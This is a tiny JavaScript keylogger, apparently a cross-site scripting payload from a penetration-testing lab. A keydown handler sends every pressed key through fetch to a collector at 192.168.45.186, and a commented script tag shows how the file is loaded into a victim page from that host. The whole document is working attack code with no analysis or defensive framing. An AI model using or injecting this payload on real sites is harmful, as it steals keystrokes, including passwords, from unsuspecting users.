function logKey(event){
    fetch("http://192.168.45.186/k?key=" + event.key)
}

document.addEventListener('keydown', logKey);


//<script src="http://192.168.45.186/keylog.js"></script>